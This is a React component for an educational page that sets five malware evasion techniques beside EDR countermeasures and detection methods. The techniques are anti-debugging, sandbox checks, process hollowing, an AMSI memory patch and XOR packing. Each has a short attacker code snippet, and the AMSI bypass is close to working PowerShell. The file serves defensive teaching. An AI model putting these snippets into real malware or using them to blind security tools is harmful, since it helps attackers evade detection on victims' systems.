import React, { useState } from 'react';
import { 
  ShieldAlert, 
  ShieldCheck, 
  Layers, 
  EyeOff, 
  Cpu, 
  Lock, 
  Terminal, 
  Clock, 
  FileCode, 
  CheckCircle2, 
  AlertTriangle 
} from 'lucide-react';

interface EvasionTechnique {
  id: string;
  name: string;
  category: string;
  attackerGoal: string;
  attackerCodeExample: string;
  defenderCountermeasure: string;
  detectionMechanism: string;
  toolsUsed: string[];
}

const EVASION_TECHNIQUES: EvasionTechnique[] = [
  {
    id: 'anti-debugging',
    name: '1. Anti-Debugging & Environment Checks',
    category: 'Analysis Evasion',
    attackerGoal: 'Detects if a reverse engineer is stepping through code in x64dbg, IDA Pro, or Ghidra and terminates prematurely.',
    attackerCodeExample: `// Checks PEB (Process Environment Block) BeingDebugged flag
if (IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugger)) {
    ExitProcess(0); // Exit benignly to deceive the analyst!
}
// Hardware breakpoint detection via Thread Context
CONTEXT ctx;
GetThreadContext(GetCurrentThread(), &ctx);
if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) ExitProcess(0);`,
    defenderCountermeasure: 'EDRs and sandboxes hook API return values (forcing IsDebuggerPresent to return FALSE), clear debug registers, and use kernel hypervisors (like ScyllaHide).',
    detectionMechanism: 'Heuristic flagging of frequent PEB checks and API monitoring of CheckRemoteDebuggerPresent in pre-execution triage.',
    toolsUsed: ['ScyllaHide', 'TitanEngine', 'API Hooking', 'Hypervisor-based introspection']
  },
  {
    id: 'anti-vm',
    name: '2. Sandbox / Anti-VM Evasion',
    category: 'Sandbox Evasion',
    attackerGoal: 'Detects if running inside automated sandbox environments (Cuckoo, ANY.RUN, VirtualBox, VMware) by checking screen resolution, mouse movement, or RAM size.',
    attackerCodeExample: `// Check if RAM < 4GB or CPU cores <= 1 (typical automated sandbox)
SYSTEM_INFO sysInfo;
GetSystemInfo(&sysInfo);
if (sysInfo.dwNumberOfProcessors < 2) ExitProcess(0);

// Check if human mouse moves within 10 seconds
POINT pt1, pt2;
GetCursorPos(&pt1);
Sleep(10000); // Wait 10s
GetCursorPos(&pt2);
if (pt1.x == pt2.x && pt1.y == pt2.y) ExitProcess(0);`,
    defenderCountermeasure: 'Modern Sandboxes emulate realistic human interaction (simulated mouse drift, randomized keystrokes, simulated browser history) and provision multi-core VMs.',
    detectionMechanism: 'Time acceleration engines monitor artificial long sleep calls (Sleep(60000)) and fast-forward system clocks to force payload detonation.',
    toolsUsed: ['Dynamic Sleep Acceleration', 'Human Interaction Simulators', 'Hardware virtualization spoofing']
  },
  {
    id: 'process-hollowing',
    name: '3. Process Hollowing / Injection',
    category: 'Execution & Defense Evasion',
    attackerGoal: 'Launches a benign system process (e.g. svchost.exe or explorer.exe), unmaps its legitimate code from memory, and injects malware shellcode in its place.',
    attackerCodeExample: `CreateProcessA("svchost.exe", NULL, ..., CREATE_SUSPENDED, &pi);
NtUnmapViewOfSection(pi.hProcess, pBaseAddress);
LPVOID pRemote = VirtualAllocEx(pi.hProcess, pBaseAddress, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, pRemote, maliciousPayload, size, NULL);
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread); // svchost.exe now runs malware!`,
    defenderCountermeasure: 'Memory scanning tools compare on-disk executable headers against in-memory mapped code pages (Memory-Disk Diffing).',
    detectionMechanism: 'Flags unbacked executable memory regions (PAGE_EXECUTE_READWRITE pages with no corresponding file mapping on disk) and monitors NtUnmapViewOfSection system calls.',
    toolsUsed: ['HollowsHunter', 'Pe-sieve', 'Windows Defender Memory Inspection', 'CrowdStrike Threat Graph']
  },
  {
    id: 'amsi-bypass',
    name: '4. Memory-Only AMSI Bypass',
    category: 'Fileless Evasion',
    attackerGoal: 'Patches Microsoft Antimalware Scan Interface (amsi.dll) memory buffer so all subsequent PowerShell and script blocks are marked as AMSI_RESULT_CLEAN.',
    attackerCodeExample: `$patch = [Byte[]] (0xC3) # x86/x64 RET instruction
$dll = [Win32]::LoadLibrary("amsi.dll")
$addr = [Win32]::GetProcAddress($dll, "AmsiScanBuffer")
[Win32]::VirtualProtect($addr, 1, 0x40, [ref]$old)
[Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 1)
# Now AMSI is completely blinded for the current process!`,
    defenderCountermeasure: 'Kernel-level ETW (Event Tracing for Windows) and AMSI integrity guard hooks that monitor writes to amsi.dll code pages.',
    detectionMechanism: 'PowerShell Script Block Logging (Event ID 4104) captures raw script text before AMSI execution; kernel drivers detect modification of critical DLL text sections.',
    toolsUsed: ['Sysmon', 'PowerShell Script Block Logging (EID 4104)', 'ETW Threat Intelligence', 'AMSI Guard']
  },
  {
    id: 'runtime-packing',
    name: '5. Polymorphic Packing & Crypters',
    category: 'Signature Evasion',
    attackerGoal: 'Compresses and encrypts the executable binary with a randomized decryption stub (UPX, custom crypter), changing the SHA-256 hash and hiding all strings/APIs.',
    attackerCodeExample: `// Encrypted payload in .rsrc or .data section
void DecryptStub(unsigned char* pData, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        pData[i] ^= (key + (i % 7)); // Dynamic XOR multi-byte key
    }
}
// Decrypts in RAM and jumps to unpacked Original Entry Point (OEP)
DecryptStub(payload, len, 0x5A);
goto *OriginalEntryPoint;`,
    defenderCountermeasure: 'Heuristic Shannon Entropy scanning flags files with entropy > 7.2. Dynamic sandboxes allow the decryption stub to execute in memory and dump the unmasked OEP.',
    detectionMechanism: 'Automatic unpacker engines monitor memory allocation transitions from WRITE -> EXECUTE and capture the binary at Original Entry Point (OEP).',
    toolsUsed: ['PE-bear', 'Capa', 'Entropy Scanners', 'Automated Memory Dumpers']
  }
];

export const EvasionDefenseLab: React.FC = () => {
  const [selectedTechniqueId, setSelectedTechniqueId] = useState<string>(EVASION_TECHNIQUES[0].id);

  const selectedTechnique = EVASION_TECHNIQUES.find(t => t.id === selectedTechniqueId) || EVASION_TECHNIQUES[0];

  return (
    <div className="space-y-6 pb-12">
      {/* Overview Banner */}
      <div className="rounded-2xl bg-gradient-to-r from-slate-900 via-slate-900/90 to-slate-950 border border-slate-800 p-6 space-y-3">
        <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-rose-950/80 border border-rose-700/60 text-xs font-mono text-rose-300">
          <EyeOff className="w-3.5 h-3.5" />
          <span>Evasion vs Detection Countermeasures</span>
        </div>
        <h2 className="text-2xl font-extrabold text-slate-100">
          Malware Evasion Techniques & Modern Countermeasures
        </h2>
        <p className="text-slate-300 text-xs sm:text-sm max-w-3xl leading-relaxed">
          Malware authors spend immense effort attempting to bypass antivirus signatures, sandbox environments, and memory scanners. Explore the most infamous evasion strategies and see how modern EDRs defeat them.
        </p>
      </div>

      {/* Technique Selector Cards */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3">
        {EVASION_TECHNIQUES.map((tech) => {
          const isSelected = selectedTechniqueId === tech.id;
          return (
            <button
              key={tech.id}
              onClick={() => setSelectedTechniqueId(tech.id)}
              className={`p-3.5 rounded-xl text-left border transition-all ${
                isSelected
                  ? 'bg-slate-900 border-cyan-500/70 shadow-md shadow-cyan-950/40 text-cyan-200'
                  : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-slate-200 hover:bg-slate-900/60'
              }`}
            >
              <span className="text-[10px] font-mono text-cyan-400 block mb-1">{tech.category}</span>
              <h4 className="text-xs font-bold text-slate-200 line-clamp-2">{tech.name}</h4>
            </button>
          );
        })}
      </div>

      {/* Selected Evasion Deep Dive */}
      <div className="rounded-2xl bg-slate-900 border border-slate-800 p-6 space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-800">
          <div>
            <div className="flex items-center gap-2">
              <span className="text-xs font-mono px-2 py-0.5 rounded bg-slate-800 text-slate-300">
                {selectedTechnique.category}
              </span>
              <h3 className="text-lg font-bold text-slate-100">{selectedTechnique.name}</h3>
            </div>
            <p className="text-xs text-slate-400 mt-1">{selectedTechnique.attackerGoal}</p>
          </div>

          <div className="flex items-center gap-1.5 flex-wrap">
            {selectedTechnique.toolsUsed.map((tool) => (
              <span key={tool} className="text-[10px] font-mono px-2 py-1 rounded bg-slate-950 border border-slate-800 text-cyan-300">
                {tool}
              </span>
            ))}
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* Attacker Perspective (Red Team) */}
          <div className="rounded-xl bg-slate-950 border border-rose-900/40 p-5 space-y-3">
            <div className="flex items-center justify-between">
              <h4 className="text-xs font-mono font-bold uppercase tracking-wider text-rose-400 flex items-center gap-1.5">
                <AlertTriangle className="w-3.5 h-3.5 text-rose-400" />
                Attacker Evasion Strategy (Red Team)
              </h4>
              <span className="text-[10px] font-mono text-slate-500">How it evades</span>
            </div>

            <p className="text-xs text-slate-300 leading-relaxed">
              {selectedTechnique.attackerGoal}
            </p>

            <div>
              <span className="text-[11px] font-mono text-slate-400 block mb-1">Conceptual Disassembly / Code:</span>
              <pre className="p-3 rounded-lg bg-slate-900 border border-slate-800 font-mono text-[11px] text-rose-200 overflow-x-auto leading-relaxed">
                {selectedTechnique.attackerCodeExample}
              </pre>
            </div>
          </div>

          {/* Defender Perspective (Blue Team) */}
          <div className="rounded-xl bg-slate-950 border border-cyan-900/40 p-5 space-y-4">
            <div className="flex items-center justify-between">
              <h4 className="text-xs font-mono font-bold uppercase tracking-wider text-cyan-400 flex items-center gap-1.5">
                <ShieldCheck className="w-3.5 h-3.5 text-cyan-400" />
                Detection & Countermeasure (Blue Team)
              </h4>
              <span className="text-[10px] font-mono text-slate-500">How AMDS catches it</span>
            </div>

            <div className="space-y-3">
              <div className="bg-slate-900/80 p-3.5 rounded-lg border border-slate-800/80 space-y-1">
                <h5 className="text-xs font-bold text-slate-200">Defensive Architecture Countermeasure:</h5>
                <p className="text-xs text-slate-300 leading-relaxed">{selectedTechnique.defenderCountermeasure}</p>
              </div>

              <div className="bg-cyan-950/20 p-3.5 rounded-lg border border-cyan-800/40 space-y-1">
                <h5 className="text-xs font-bold text-cyan-300">Detection Engine Mechanism:</h5>
                <p className="text-xs text-slate-300 leading-relaxed">{selectedTechnique.detectionMechanism}</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
